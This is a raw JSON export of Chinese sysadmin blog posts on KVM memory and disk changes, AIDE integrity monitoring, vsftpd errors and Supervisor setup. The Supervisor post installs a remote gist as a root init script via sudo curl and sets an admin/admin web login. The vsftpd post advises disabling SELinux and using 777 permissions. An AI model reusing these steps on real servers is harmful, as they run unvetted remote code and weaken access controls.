123virsh # edit dataname1 &lt;memory unit='KiB'&gt;4194304&lt;/memory&gt; &lt;currentMemory unit='KiB'&gt;4194304&lt;/currentMemory&gt; 然后保存退出。 设置生效： 123456789101112131415161718192021222324virsh setmaxmem dataname1 4194304 --config #dataname1 处于shut off状态时才能设置成功virsh setmem dataname1 4#数值不能超过maxmem setmem意思是改变内存的分配查看生效内存现在变4G内存。virsh # dominfo dataname1Id: -名称： dataname1UUID: 0301d59b-5b19-40af-b0f9-063d646a38dbOS 类型： hvm状态： 关闭CPU： 2最大内存： 4194304 KiB使用的内存： 0 KiB持久： 是自动启动： 禁用管理的保存： 否安全性模式： selinux安全性 DOI： 0 这里提下还有些时候KVM虚拟机内存超配后-虚拟机内存减半现象使用kvm虚拟机时，如果配置了内存超用，会发现创建的虚拟机内存为计算方案的一半。 分析： 配置完超配系数为2以后，创建虚拟机，打开虚拟机（计算方案为2C/2G）的xml配置文件如下： 12345&lt;name&gt;i-2-32-VM&lt;/name&gt;&lt;uuid&gt;eb1a307f-ff54-4f40-aa88-d6071535cd92&lt;/uuid&gt;&lt;description&gt;dataname1&lt;/description&gt;&lt;memory unit='KiB'&gt;2097152&lt;/memory&gt;&lt;currentMemory unit='KiB'&gt;1048576&lt;/currentMemory&gt; 可以看到，虚拟机中实际显示的为currentMemory（minRam），即为当前内存为1G。但memory unit实际为最大使用内存（maxRam）。可以看到，2G实际被定义为虚拟机的maxRam，但实际分配为minRam，即看到的减半现象。 解决： 1.编辑agent配置文件，添加参数“vm.memballoon.disable=true” 12[root@SJCloudKVM-5 agent]# cat /etc/cloudstack/agent/agent.properties| grep memvm.memballoon.disable=true 2.重启libvirtd和cloudstack-agent服务。3.关闭，并重新启动虚拟机。 关于vm.memballoon.disable=true的解释： 123# vm.memballoon.disable=true# Disable memory ballooning on vm guestsfor overcommit, by default overcommit feature enables balloon and setscurrentMemoryto a minimum value. 调整虚拟机硬盘大小 有两种方法添加： 第一种：是要通过修改配置文件来添加硬盘，我们首先要关闭虚拟机，否则无法正常添加。通过修改虚拟机配置文件进行添加，永久生效。 第二种：通过virsh attach-disk命令添加一块硬盘到系统中，即时生效，但系统重启后新硬盘会消失。 第二种方法简单：现在开始使用virsh attach-disk命令把新硬盘添加到虚拟机上。virsh attach-disk 虚拟机名称 /vhost/新建的硬盘.img vdb 那我们都选择第一种方法： 关闭虚拟机，然后使用virsh edit命令修改虚拟机的主配置文件。 12345678910 virsh # shutdown dataname2 然后给他新建个硬盘: qemu-img create -f qcow2 /opt/vm/dataname2-add.img 150G虚拟机的所有配置文件默认都存放在/etc/libvirt/qemu，如下:-rw-------. 1 root root 3868 7月 9 18:49 dataname2.xml 编辑虚拟机配置文件，如下:默认在第32行 默认配置前： 123456789101112[root@kvm qemu]# virsh edit dataname2 &lt;disk type='file' device='disk'&gt; &lt;driver name='qemu' type='qcow2'/&gt; &lt;source file='/opt/vm/dataname2.img'/&gt; &lt;target dev='vda' bus='virtio'/&gt; &lt;address type='pci' domain='0x0000' bus='0x00' slot='0x06' function='0x0'/&gt; &lt;/disk&gt; &lt;disk type='block' device='cdrom'&gt; &lt;driver name='qemu' type='raw'/&gt; &lt;target dev='hda' bus='ide'/&gt; &lt;readonly/&gt; &lt;address type='drive' controller='0' bus='0' target='0' unit='0'/&gt; 配置后修改，我们找到有关硬盘的代码： 123456789101112131415&lt;disk type='file' device='disk'&gt; &lt;driver name='qemu' type='qcow2'/&gt; &lt;source file='/opt/vm/dataname2.img'/&gt; &lt;target dev='vda' bus='virtio'/&gt; &lt;address type='pci' domain='0x0000' bus='0x00' slot='0x06' function='0x0'/&gt; &lt;/disk&gt;现在我们在&lt;/disk&gt;这之后，添加如下的代码 &lt;disk type='file' device='disk'&gt; &lt;driver name='qemu' type='qcow2'/&gt; &lt;source file='/opt/vm/dataname2-add.img'/&gt; &lt;target dev='vdb' bus='virtio'/&gt; &lt;address type='pci' domain='0x0000' bus='0x00' slot='0x08' function='0x0'/&gt; &lt;/disk&gt;保存退出。编辑了域 dataname2 XML 配置。 注意其中type表示硬盘的格式 file表示硬盘所在的路径 dev表示硬盘在系统中显示的硬盘名称 bus表示硬盘的接线类型，如果是windows系统一般是ide。 添加完毕后，我们来启动虚拟机看看实际的效果。 123456789101112131415161718192021[root@datanode2 ~]# fdisk -lDisk /dev/vda: 107.4 GB, 107374182400 bytes16 heads, 63 sectors/track, 208050 cylindersUnits = cylinders of 1008 * 512 = 516096 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x000e0dd6 Device Boot Start End Blocks Id System/dev/vda1 * 3 1018 512000 83 LinuxPartition 1 does not end on cylinder boundary./dev/vda2 1018 208051 104344576 8e Linux LVMPartition 2 does not end on cylinder boundary.Disk /dev/vdb: 161.1 GB, 161061273600 bytes16 heads, 63 sectors/track, 312076 cylindersUnits = cylinders of 1008 * 512 = 516096 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x00000000 然后就是格式化挂载上去就可以了。","raw":null,"content":null,"categories":[{"name":"虚拟化","slug":"虚拟化","permalink":"http://blog.yangcvo.me/categories/虚拟化/"}],"tags":[{"name":"KVM","slug":"KVM","permalink":"http://blog.yangcvo.me/tags/KVM/"}]},{"title":"使用AIDE做Linux高级入侵检测文件监控","slug":"运维安全/使用AIDE做Linux高级入侵检测文件监控","date":"2015-04-01T10:06:06.000Z","updated":"2017-03-14T05:53:58.000Z","comments":true,"path":"2015/04/01/运维安全/使用AIDE做Linux高级入侵检测文件监控/","link":"","permalink":"http://blog.yangcvo.me/2015/04/01/运维安全/使用AIDE做Linux高级入侵检测文件监控/","excerpt":"","text":"1、aide介绍 AIDE(Adevanced Intrusion Detection Environment,高级入侵检测环境)是个入侵检测工具，主要用途是检查文本的完整性。 AIDE能够构造一个指定文档的数据库，他使用aide.conf作为其配置文档。AIDE数据库能够保存文档的各种属性，包括：权限(permission)、索引节点序号(inode number)、所属用户(user)、所属用户组(group)、文档大小、最后修改时间(mtime)、创建时间(ctime)、最后访问时间(atime)、增加的大小连同连接数。AIDE还能够使用下列算法：sha1、md5、rmd160、tiger，以密文形式建立每个文档的校验码或散列号。 常见的入侵检测软件： tripwire–操作比较复杂,aide–用以代替tripwire,比较简单. 系统环境： RHEL 6.2 [2.6.32-220.el6.i686] 软件环境： 2、aide安装 配置使用yum rpm二进制安装 1yum -y install aide 我的配置文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227mv /etc/aide.conf /etc/aide.conf.bakvim /etc/aide.conf # Example configuration file for AIDE.@@define DBDIR /var/lib/aide #基准数据库目录@@define LOGDIR /var/log/aide #日志目录 # The location of the database to be read.database=file:@@&#123;DBDIR&#125;/aide.db.gz #基础数据库文件 # The location of the database to be written. #database_out=sql:host:port:database:login_name:passwd:table#database_out=file:aide.db.newdatabase_out=file:@@&#123;DBDIR&#125;/aide.db.new.gz #更新数据库文件 # Whether to gzip the output to databasegzip_dbout=yes # Default.verbose=5 report_url=file:@@&#123;LOGDIR&#125;/aide.logreport_url=stdout#report_url=stderr#NOT IMPLEMENTED report_url=mailto:root@foo.com#NOT IMPLEMENTED report_url=syslog:LOG_AUTH # These are the default rules.##p: permissions#i: inode:#n: number of links#u: user#g: group#s: size#b: block count#m: mtime#a: atime#c: ctime#S: check for growing size#acl: Access Control Lists#selinux SELinux security context#xattrs: Extended file attributes#md5: md5 checksum#sha1: sha1 checksum#sha256: sha256 checksum#sha512: sha512 checksum#rmd160: rmd160 checksum#tiger: tiger checksum #haval: haval checksum (MHASH only)#gost: gost checksum (MHASH only)#crc32: crc32 checksum (MHASH only)#whirlpool: whirlpool checksum (MHASH only) #R: p+i+n+u+g+s+m+c+acl+selinux+xattrs+md5#L: p+i+n+u+g+acl+selinux+xattrs#E: Empty group#&gt;: Growing logfile p+u+g+i+n+S+acl+selinux+xattrsR = p+i+n+u+g+s+m+c+acl+selinux+xattrs+md5L = p+i+n+u+g+acl+selinux+xattrs&gt; = p+u+g+i+n+S+acl+selinux+xattrs # You can create custom rules like this.# With MHASH...# ALLXTRAHASHES = sha1+rmd160+sha256+sha512+whirlpool+tiger+haval+gost+crc32ALLXTRAHASHES = sha1+rmd160+sha256+sha512+tiger# Everything but access time (Ie. all changes)EVERYTHING = R+ALLXTRAHASHES # Sane, with multiple hashes# NORMAL = R+rmd160+sha256+whirlpoolNORMAL = R+rmd160+sha256 # For directories, don't bother doing hashesDIR = p+i+n+u+g+acl+selinux+xattrs # Access control only PERMS = p+i+u+g+acl+selinux # Logfile are special, in that they often change LOG = &gt; # Just do md5 and sha256 hashes LSPP = R+sha256 # Some files get updated automatically, so the inode/ctime/mtime change # but we want to know when the data inside them changes DATAONLY = p+n+u+g+s+acl+selinux+xattrs+md5+sha256+rmd160+tiger # Next decide what directories/files you want in the database. /boot NORMAL/bin NORMAL/sbin NORMAL/lib NORMAL/lib64 NORMAL/opt NORMAL/usr NORMAL/root NORMAL# These are too volatile!/usr/src!/usr/tmp!/usr/share #通过文件路径前面加感叹号 ! 排除这个路径的监控,请自定义 # Check only permissions, inode, user and group for /etc, but# cover some important files closely./etc PERMS!/etc/mtab # Ignore backup files!/etc/.*~/etc/exports NORMAL/etc/fstab NORMAL/etc/passwd NORMAL/etc/group NORMAL/etc/gshadow NORMAL/etc/shadow NORMAL/etc/security/opasswd NORMAL /etc/hosts.allow NORMAL/etc/hosts.deny NORMAL /etc/sudoers NORMAL/etc/skel NORMAL /etc/logrotate.d NORMAL /etc/resolv.conf DATAONLY /etc/nscd.conf NORMAL/etc/securetty NORMAL # Shell/X starting files/etc/profile NORMAL/etc/bashrc NORMAL/etc/bash_completion.d/ NORMAL/etc/login.defs NORMAL/etc/zprofile NORMAL/etc/zshrc NORMAL/etc/zlogin NORMAL/etc/zlogout NORMAL/etc/profile.d/ NORMAL/etc/X11/ NORMAL # Pkg manager/etc/yum.conf NORMAL/etc/yumex.conf NORMAL/etc/yumex.profiles.conf NORMAL/etc/yum/ NORMAL /etc/yum.repos.d/ NORMAL /var/log LOG /var/run/utmp LOG # This gets new/removes-old filenames daily!/var/log/sa # As we are checking it, we've truncated yesterdays size to zero. !/var/log/aide.log # LSPP rules...# AIDE produces an audit record, so this becomes # /var/log/audit/ LSPP/etc/audit/ LSPP/etc/libaudit.conf LSPP/usr/sbin/stunnel LSPP/var/spool/at LSPP/etc/at.allow LSPP/etc/at.deny LSPP/etc/cron.allow LSPP/etc/cron.deny LSPP/etc/cron.d/ LSPP/etc/cron.daily/ LSPP/etc/cron.hourly/ LSPP/etc/cron.monthly/ LSPP/etc/cron.weekly/ LSPP/etc/crontab LSPP/var/spool/cron/root LSPP /etc/login.defs LSPP/etc/securetty LSPP/var/log/faillog LSPP/var/log/lastlog LSPP /etc/hosts LSPP/etc/sysconfig LSPP /etc/inittab LSPP/etc/grub/ LSPP/etc/rc.d LSPP /etc/ld.so.conf LSPP /etc/localtime LSPP /etc/sysctl.conf LSPP /etc/modprobe.conf LSPP /etc/pam.d LSPP/etc/security LSPP/etc/aliases LSPP/etc/postfix LSPP /etc/ssh/sshd_config LSPP /etc/ssh/ssh_config LSPP /etc/stunnel LSPP /etc/vsftpd.ftpusers LSPP /etc/vsftpd LSPP /etc/issue LSPP/etc/issue.net LSPP /etc/cups LSPP # With AIDE's default verbosity level of 5, these would give lots of# warnings upon tree traversal. It might change with future version.##=/lost\\+found DIR#=/home DIR # Ditto /var/log/sa reason...!/var/log/and-httpd # Admins dot files constantly change, just check perms/root/\\..* PERMS 下一步： 初始化监控数据库(这需要一些时间) 123456 /usr/sbin/aide -c /etc/aide.conf --init``` 把当前初始化的数据库作为开始的基础数据库``` bash cp /var/lib/aide/aide.db.new.gz /var/lib/aide/aide.db.gz 如果是正常的改动 更新改动到基础数据库 12aide --updatecd /var/lib/aide/ 覆盖替换旧的数据库 1mv aide.db.new.gz aide.db.gz 在终端中查看检测结果 1aide --check 检查文件改动 保存到文件 1234567 aide --check --report=file:/tmp/aide-report-`date +%Y%m%d`.txt``` 定时任务执行aide检测报告和自动邮件发送aide检测报告(如果没有mail, yum install mail,还需要有本地邮件服务支持, yum install sendmail;/etc/init.d/sendmail start) ``` bash crontab -e 00 02 * * * /usr/sbin/aide -C -V4 | /bin/mail -s \"AIDE REPORT $(date +%Y%m%d)\" root@localhost 5、参考 官网 :http://aide.sourceforge.net/ AIDE –Linux高级入侵检测 http://gupt12.blog.51cto.com/7651206/1263183 参考：http://www.iamle.com/archives/1664.html","raw":null,"content":null,"categories":[{"name":"运维安全","slug":"运维安全","permalink":"http://blog.yangcvo.me/categories/运维安全/"}],"tags":[{"name":"Operation safety","slug":"Operation-safety","permalink":"http://blog.yangcvo.me/tags/Operation-safety/"}]},{"title":"python及常用工具的安装","slug":"python/python及常用工具的安装 ","date":"2015-02-26T10:48:10.000Z","updated":"2016-12-17T10:58:10.000Z","comments":true,"path":"2015/02/26/python/python及常用工具的安装 /","link":"","permalink":"http://blog.yangcvo.me/2015/02/26/python/python及常用工具的安装 /","excerpt":"","text":"python及常用工具的安装现在python一般情况下我们使用的2.7版本.系统自带的是2.6版本，可以在官方https://www.python.org/downloads/ 下载,它的安装还是很简单的。tar包下载后可以直接解压，configure、make、make install即可。 python安装以后注意：这里要强调一下的是安装Python后很有可能linux的yum就不能正常使用了。一方面我们可以改下yum可执行文件的内容，文件位置为/usr/bin/yum 123第一行#!/usr/bin/python改成#!/usr/bin/python2.4(python2.6)，也就是系统原来的python 另外一种是把新按装的Python可执行文件ln到/usr/local/bin这里，其它的也可以不用更改。这样即不会影响到yum的使用，也不会影响新安装版本的使用。如果有特殊的需求那就根据情况来设置环境变量吧。","raw":null,"content":null,"categories":[{"name":"Python","slug":"Python","permalink":"http://blog.yangcvo.me/categories/Python/"}],"tags":[]},{"title":"建立虚拟用户的vsftpd安装配置报错问题收集","slug":"Vsftpd/建立虚拟用户的vsftpd安装配置报错问题收集","date":"2015-02-25T10:48:10.000Z","updated":"2017-03-14T05:44:02.000Z","comments":true,"path":"2015/02/25/Vsftpd/建立虚拟用户的vsftpd安装配置报错问题收集/","link":"","permalink":"http://blog.yangcvo.me/2015/02/25/Vsftpd/建立虚拟用户的vsftpd安装配置报错问题收集/","excerpt":"","text":"vsftp报错问题收集1. 解决vsftp错误500 OOPS: cannot change directory:/home/** 目录123打开/etc/selinux/config将selinux=enforcing或permissive改成disabled。然后给目录权限：给那个www目录设置vsftp的权限，或者直接777. 2. 530 Login incorrect123456789101112131415161718[root@gtl ~]# ftp localhostConnected to localhost.localdomain.220 (vsFTPd 2.0.5)530 Please login with USER and PASS.530 Please login with USER and PASS.KERBEROS_V4 rejected as an authentication typeName (localhost:root): user331 Please specify the password.Password:530 Login incorrect.Login failed.ftp&gt; bye221 Goodbye.只有用匿名anonymous才可登录,其余所有用户都报530 Login incorrect错local_enable=YESwrite_enable=YESpam_service_name=vsftpduserlist_enable=YES 原因分析： 其实就是少了一行pam_service_name=vsftpd 解决方法： 只要把这行pam_service_name=vsftpd添加到vsftpd.conf配置文件中，然后重启vstfpd即可。 3.530 Permission denied查看vsftpd的配置，配置文件中限定了vsftpd用户连接控制配置。 123vsftpd.ftpusers：位于/etc目录下。它指定了哪些用户账户不能访问FTP服务器，例如root等。vsftpd.user_list：位于/etc目录下。该文件里的用户账户在默认情况下也不能访问FTP服务器，仅当vsftpd .conf配置文件里启用userlist_enable=NO选项时才允许访问。vsftpd.conf：位于/etc/vsftpd目录下。来自定义用户登录控制、用户权限控制、超时设置、服务器功能选项、服务器性能选项、服务器响应消息等FTP服务器的配置。 3.配置修改完成后，执行service vsftpd restart重启vsftpd服务。 虚拟用户如果是外网，从公司内网访问出现报错。 错误: 无法建立数据连接：ECONNREFUSED - Connection refused by server错误: 连接超时 打开 FileZilla 的“站点管理器”，选中你要设置的站点连接，切换到“传输设置”选项，勾选“限制并发连接数”并设置“最大并发连接数”为1即可。 打开 FileZilla 的“站点管理器”，选中你要设置的站点连接，切换到“传输设置”选项，选择主动即可。","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.yangcvo.me/categories/Linux/"}],"tags":[{"name":"Linux note","slug":"Linux-note","permalink":"http://blog.yangcvo.me/tags/Linux-note/"},{"name":"Vsftpd","slug":"Vsftpd","permalink":"http://blog.yangcvo.me/tags/Vsftpd/"}]},{"title":"Supervisor 监控进程","slug":"Supervisor监控进程/Supervisor 进程持久化监控工具 ","date":"2015-02-24T07:48:10.000Z","updated":"2016-12-17T11:11:00.000Z","comments":true,"path":"2015/02/24/Supervisor监控进程/Supervisor 进程持久化监控工具 /","link":"","permalink":"http://blog.yangcvo.me/2015/02/24/Supervisor监控进程/Supervisor 进程持久化监控工具 /","excerpt":"","text":"Supervisor 监控进程在重要的一些服务运行时间较长有时候，进程突然终止服务，可能是没有资源了，也可能是意外，比如说：因为 OOM 被杀；或者由于 BUG 导致崩溃；亦或者误操作等等，此时，我们需要重新启动进程。 使用 Supervisor 的原因 如果你有很多进程在跑，不时还需要 start/stop/restart 一下进程 如果哪天由于某种原因，进程挂了，你需要重启进程或定时执行脚本 如果有多个进程，有些是同一项目，尽量可以同时启动/停止等 如果你有以上任意一种情况，那用 Supervisor 管理进程无疑再合适不过了，把你所有 *nix 进程都配置进 ini 文件中，这样所有的进程就变成了 Supervisor 的子进程。对于子进程，Supervisor 可以做到准确管理（有 web 界面），可以进行分组，一组组的 或者授权非 root 用户。 在linux下监控进程，可以使用inittab，最近找到了supervisor，也很好用，记录一下： 安装依赖python1、系统要安装python，最低版本2.7以上 并安装与之对应的setuptools，下载地址在此 2、安装： # wget https://pypi.python.org/packages/6b/dd/a7de8caeeffab76bacf56972b3f090c12e0ae6932245abbce706690a6436/setuptools-28.3.0.tar.gz#md5=a46750b6bd90a1343466bd57b0e2721a 解压安装# python setup.py install 3、查看Python版本 # python -V Python 2.7.5 yum 安装Supervisor 环境Centos6.7，安装方法执行： yum install supervisor pip install supervisor官网安装方法 编译安装Supervisor setuptools的（最新）来自http://pypi.python.org/pypi/setuptools。 1、安装supervisor，下载地址在此，解压缩后 1234# wget https://pypi.python.org/packages/80/37/964c0d53cbd328796b1aeb7abea4c0f7b0e8c7197ea9b0b9967b7d004def/supervisor-3.3.1.tar.gz# tar -zxvf supervisor-3.3.1.tar.gz -C /opt/.# cd /opt/supervisor-3.3.1/# python setup.py install 这就ok了，然后创建配置文件这将打印一个“样本”超级配置文件到终端的标准输出。 创建目录 123# mkdir -m 755 -p /etc/supervisor/# mkdir -m 755 conf.d# echo_supervisord_conf &gt; /etc/supervisor/supervisord.conf 如果你没有root访问权限，或者你不想把 supervisord.conf文件中的/ etc / supervisord.conf，你可以将它放在当前目录（echo_supervisord_conf &gt; supervisord.conf），并开始supervisord与-c标志，以指定配置文件的位置。 配置文件详解supervisor 通过对应的配置文件来进行进程的监控和管理，因此安装完成之后我们需要给将要监控的进程写一个配置文件。每个进程的配置文件都建议单独分拆，放在 /etc/supervisor/conf.d/ 目录下，以 .conf 作为扩展名。如我们的 redis.conf 配置文件。 下面是配置文件的格式和支持的参数，只需要写我们需要配置的参数即可。 12345678910111213141516171819202122232425262728293031323334353637383940[supervisorctl]serverurl=unix:///tmp/supervisor.sock ; use a unix:// URL for a unix socket;serverurl=http://127.0.0.1:9001 ; use an http:// url to specify an inet socket;username=chris ; should be same as http_username if set;password=123 ; should be same as http_password if set;prompt=mysupervisor ; cmd line prompt (default \"supervisor\");history_file=~/.sc_history ; use readline history if available添加单个进程; 管理单个进程的配置，可创建多个，下面是所有可能的配置选项;[program:theprogramname];command=/bin/cat ; 启动进程的命令 使用相对路径，可以加参数;process_name=%(program_name)s ; 进程名称 表达式 (默认 %(program_name)s);numprocs=1 ; 进程数目 (def 1);directory=/tmp ; 执行命令所在的目录 (def no cwd);umask=022 ; 进程默认权限 (default None);priority=999 ; 进程启动相对优先权 (default 999);autostart=true ; 跟随supervisor启动时启动 (default: true);autorestart=unexpected ; 计划启动 (default: unexpected);startsecs=1 ; 延时启动 (def. 1);startretries=3 ; 最多连续启动失败 (default 3);exitcodes=0,2 ; 进程结束代码 (default 0,2);stopsignal=QUIT ; signal used to kill process (default TERM);stopwaitsecs=10 ; 最长结束等待时间，否则使用 SIGKILL (default 10);stopasgroup=false ; 是否想UNIX进程组发送结束信号 (default false);killasgroup=false ; SIGKILL UNIX 进程组 (def false);user=chrism ; 设置启动此程序的用户;redirect_stderr=true ; 重定向程序的标准错误到标准输出 (default false);stdout_logfile=/a/path ; 标准输出的日志路径, NONE for none; default AUTO;stdout_logfile_maxbytes=1MB ; 日志文件最大值，否则循环写入 (default 50MB);stdout_logfile_backups=10 ; 标准输出日志备份数目 (default 10);stdout_capture_maxbytes=1MB ; number of bytes in 'capturemode' (default 0);stdout_events_enabled=false ; emit events on stdout writes (default false);stderr_logfile=/a/path ; 标准错误输出日志路径, NONE for none; default AUTO;stderr_logfile_maxbytes=1MB ; 日志文件最大值，否则循环写入 (default 50MB);stderr_logfile_backups=10 ; 标准错误日志备份数目 (default 10);stderr_capture_maxbytes=1MB ; number of bytes in 'capturemode' (default 0);stderr_events_enabled=false ; emit events on stderr writes (default false);environment=A=\"1\",B=\"2\" ; 进程附加环境 (def no adds);serverurl=AUTO 例如，可以简单的配置成: 打开/etc/supervisor/supervisord.conf 文件，到最后一行可以看到 12;[include];files = /relative/dictory/*.ini 删除这里的分号，然后添加我们配置文件/etc/supervisor/conf.d/*.conf，修改后如下 12[include]files = /etc/supervisor/conf.d/*.conf 修改完后，便可以将项目的配置文件命名为 .conf 放置在 /etc/supervisor/conf.d/ 下面。多个路径用空格隔开就可以了 以下是我的redis配置文件redis.conf 12345678[program:redis]command=/usr/local/bin/redis-server /var/lib/redis/redis.conf #被监控的进程路径autostart=trueautorestart=trueuser=redisstdout_logfile=/var/log/redis/redis-stdout.logstderr_logfile=/var/log/redis/redis-stderr.log[supervisord] 注解： program:后面表示服务名字， 会显示在管理工具里面，我给它命名为redis command表示需要运行的命令，每次start都会执行这个命令 autostart表示服务是否需要跟随supervisor启动 autorestart表示当服务挂掉的时候是否需要自动重启 user表示使用哪个用户运行该命令。 stdout_logfile和stderr_logfile用户存储标准输出和错误的日志文件 启动supervisorsupervisor有两个命令，supervisord和supervisorctl，通过supervisord管理启动和配置supervisor本身，通过supervisorctl来管理使用supervisor启动和管理的自身的一些应用，如我们的这里的redis.conf 运行命令： 12supervisord //运行supervisorsupervisorctl //打开supervisord命令行，会显示出当前监控的程序 【注意】：当supervisord以非daemon方式运行时，杀掉supervisord后，被监控的进程也退出了。而以daemon方式运行，杀掉supervisord对被监控进程无影响。 启动supervisor 用命令 1supervisord -c /etc/supervisor/supervisord.conf 关闭supervisor 用命令 1supervisorctl shutdown 如果先建的redis.conf(控制文件)，在使用启动命令后这些经过配置的程序也会启动 启动程序redis 1supervisorctl start program_name 这里的program的name是配置文件ini中的[program:name]，所以这里的program_name是redis 关闭程序redis.conf 1supervisorctl stop program_name 刷新配置文件 如果启动后，修改了ini文件，可以通过reload命令来刷新 supervisorctl reload 查看supervisor的运行状态 ps -efH|grep supervisor 这里提醒一下如果按以上操作出现以下error:12Error: .ini file does not include supervisorctl section For help, use /usr/local/bin/supervisorctl -h 或者 123456789error: &lt;class 'socket.error'&gt;, [Errno 101] Network is unreachable: file: /usr/lib/python2.7/socket.py line: 571 ``` 切换到/etc/supervisor目录执行以上的命令执行supervisorctl start APP_NAME 或者执行 supervisorctl 的相关命令，如果出现```bashunix:///tmp/supervisor.sock no such file 说明 Supervisord 服务还没有启动，检查你的 supervisord.conf 文件最后的注释 ; 取消，files 路径没有问题 12345678[include]files = /conf.d/*.ini ```bash之后在目录 /etc/supervisor 下重新运行```bashsupervisord -c /etc/supervisor/supervisord.conf 其实，可以通过supervisorctl打开supervisor的命令行控制台，然后输入help可以查看看用的命令，然后help+命令可以查看每个命令的具体功能. 这里启动服务了查看下进程： 123[root@LAN_redis1 supervisor]# ps -efH|grep supervisor root 20843 8465 0 15:19 pts/0 00:00:00 grep supervisor root 20837 1 0 15:18 ? 00:00:00 /usr/local/bin/python /usr/local/bin/supervisord -c /etc/supervisor/supervisord.conf 遇到的问题： 1 redis出现的不是running而是FATAL 状态 应该要去查看log 1log在/tmp/supervisord.log 2 日志中显示： 1gave up: redis entered FATAL state, too many start retries too quickly 修改redis.conf的daemonize为no 事实证明webdis也有这个问题，webdis要修改的是webdis.json这个配置文件 最后附上 supervisord 服务运行命令 重新 read 配置文件: supervisorctl reread 重启服务: supervisorctl reload 关闭服务: supervisorctl shutdown 参考：https://www.izixia.cn/2016/01/03/supervisor-pei-zhi-guo-cheng/ 设置web管理页面直接修改：vim supervisord.conf 1234[inet_http_server] ; inet (TCP) server disabled by defaultport=192.168.1.173:9001 ; (ip_address:port specifier, *:port for all iface)username=admin ; (default is no username (open server))password=admin ; (default is no password (open server)) 这里设置IP是监控服务器的地址。后面端口可以自己设置。用户名和密码自己设置。 这里如果有设置防火墙需要写个iptables 规则语句。 -A INPUT -p tcp -m state --state NEW -m tcp --dport 9001 -j ACCEPT 如果报如下错误redis: ERROR (no such process) 说明找不到配置的文件, 配置路径错误. 使用进入控制台后, 可以使用: 1234status 查看所有supervisor进程运行状态start &#123;your process name&#125; 启动进程stop &#123;your process name&#125; 停止进程restart &#123;your process name&#125; 重启进程 开机启动123 sudo curl https://gist.githubusercontent.com/howthebodyworks/176149/raw/d60b505a585dda836fadecca8f6b03884153196b/supervisord.sh &gt; /etc/init.d/supervisordchmod +x /etc/init.d/supervisord 安装开启启动控制程序: rcconf然后启动rcconf设置启动程序.","raw":null,"content":null,"categories":[],"tags":[{"name":"Supervisor","slug":"Supervisor","permalink":"http://blog.yangcvo.me/tags/Supervisor/"}]},{"title":"CDN加速助力高并发网站架构","slug":"性能与架构/CDN加速助力高并发网站架构","date":"2015-02-23T08:48:10.000Z","updated":"2017-04-16T06:46:36.000Z","comments":true,"path":"2015/02/23/性能与架构/CDN加速助力高并发网站架构/","link":"","permalink":"http://blog.yangcvo.me/2015/02/23/性能与架构/CDN加速助力高并发网站架构/","excerpt":"","text":"CDN加速助力高并发网站架构 架构说明：用户通过互联网访问网站需要经过的节点如下：一、要通过域名解析在域名解析处有两种方式1、自建，自建需要在域名解析前架设防火墙。 2、使用现有的域名解析提供商，需要设置成CNAME,其实就是另一个域名解析，进行跳转。在刚开始的时候建议先用CNAME方式，部署不影响用户现有方式，容易被用户接受，而且不用暂时不用担心第一级dns的问题。 总之，如果要建设idc加速，防止ddos攻击之类的服务，域名解析服务一定要提供，不管是直接提供dns服务还是间接通过cname转发。里面的主要技术，是通过用户请求的ip来得到离用户最近的服务器的地址，并通过它来提供服务。如果要进行安全防护，比如sql注入检查，js跨站脚本等可以在这一层进行处理。 二、提供虚拟机虚拟机现在主流有两种方式，一是虚拟主机，主要的软件有开源的openvz，商用的Virtuozzo等,另一类是虚拟机如vmware、xen、kvm等，这类提供虚拟操作系统，可以是异构的。他们两个的对比主要是虚拟主机的利用率比较高，可以一台主流pcserver可以虚拟几十个到上百个虚拟主机，但只能是同一类操作系统。虚拟机的运行效率相对低很多，一般主流pcserver也就十几个左右。他的有点是异构操作系统，备份管理比较方便。当然在建设的时候可以先用虚拟机，然后在虚拟机上建设虚拟主机。 如果要提供对外服务，ip地址是比不可少的，对于一个用户来说，一个域名需要几个点，就需要几个ip。 三、LVS集群由于要提供加速等服务，用户直接使用的openvz虚拟主机的性能和效率一般不大，又要提供高可用性，所以需要通过虚拟主机访问lvs集群的数据，通过lvs集群来提供服务。 四、SquidSquid是缓存，尤其是对静态页面和文件有很好加速效果。sina、sohu等都用它来做缓存加速。 五、Nginx​Nginx主要提供反向代理功能，当通过修改或者更新了页面，由nginx来负责更新缓存。还有就是动态网站，也是由nginx来提供服务。 Nginx和sqid都可以提供静态缓存功能，两者还要结合起来发挥最大效果。如果要进行安全防护，比如sql注入检查，js跨站脚本等可以在这一层进行处理。防DDOS 防ddos的主要内容由两个方面：一、带宽这个是恨重要的地方，据我现在从网上得到的资料，现在主流的idc机房一般最大提供独立百兆端口，而且价格不菲。在这种情况下可以机柜租用。这个还需要调研是否可以提供更大的带宽。 二、防火墙设备需要在接入口部署防火墙，需要根据idc接口端口来确定容量，有的idc机房也提供此服务。 三、流量牵引设备这个一般idc机房会提供此服务，这个根据需要是否需要购买。","raw":null,"content":null,"categories":[{"name":"Framework","slug":"Framework","permalink":"http://blog.yangcvo.me/categories/Framework/"}],"tags":[{"name":"Performance and framework","slug":"Performance-and-framework","permalink":"http://blog.yangcvo.me/tags/Performance-and-framework/"},{"name":"CDN","slug":"CDN","permalink":"http://blog.yangcvo.me/tags/CDN/"}]},{"title":"Ghost博客：最新版安装与更新15种主题","slug":"Blog/Ghost/Ghost博客最新版安装与更新15种主题","date":"2014-12-24T05:46:04.000Z","updated":"2017-03-14T05:39:40.000Z","comments":true,"path":"2014/12/24/Blog/Ghost/Ghost博客最新版安装与更新15种主题/","link":"","permalink":"http://blog.yangcvo.me/2014/12/24/Blog/Ghost/Ghost博客最新版安装与更新15种主题/","excerpt":"","text":"Ghost2014年底年又把Wordpress所以博客资源迁移到了新的ghost上面。 使用WordPress搭建自己的Blog站点： 这个是我 ghost：https://github.com/yangcvo/Ghost 这里我总结了下： 